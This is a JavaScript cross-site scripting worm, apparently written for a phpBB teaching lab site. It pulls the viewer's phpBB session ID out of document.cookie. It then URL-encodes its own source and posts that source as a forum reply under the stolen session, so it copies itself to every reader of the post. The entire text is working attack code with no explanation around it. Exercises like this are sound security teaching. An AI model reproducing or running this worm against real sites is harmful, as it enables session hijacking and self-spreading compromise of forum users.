<script id=worm>
var Ajax=null;
// Construct the header information for the Http request
Ajax=new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabphpbb.com/posting.php",true);
Ajax.setRequestHeader("Host","www.xsslabphpbb.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

// Steal cookie
var valueSearched = "phpbb2mysql_sid=";

// Find where mysql sid is 
var indexOfSid = document.cookie.indexOf(valueSearched);

// Move the string behind mysql_sid=
indexOfSid = indexOfSid - (-valueSearched.length);

// Check if there is a semicolon at the end, we only want one parameter from cookie
var semicolonIndex = document.cookie.indexOf(";", indexOfSid);

var stolenCookie = "";

if(semicolonIndex == -1) {
  stolenCookie = document.cookie.slice(indexOfSid);
} else {
  stolenCookie = document.cookie.slice(indexOfSid, semicolonIndex);
}

// Construct the content. The format of the content can be learned
// from LiveHttpHeader. All we need to fill is subject, message, and sid.
var content="subject=XSSWorm"; // You need to fill in the details.

// Add message body
content = content.concat("&message=Attack");

  var strCode = document.getElementById("worm");
  var beg = "%3Cscript id=worm%3E";
  var end = "%3C/script%3E";
  var urlEncSample = beg.concat( escape(strCode.innerHTML), end);
  content = content.concat(urlEncSample);

// Choose topic number
content = content.concat("&t=8");

// Add session id stolen from cookie
content = content.concat("&sid=", stolenCookie); // e.g. 642b0037b1b4f81a4141e8fb505e50f6

// Specify posting mode
content = content.concat("&mode=reply");
content = content.concat("&post=Submit");
// Send the HTTP POST request.
Ajax.send(content);
</script>
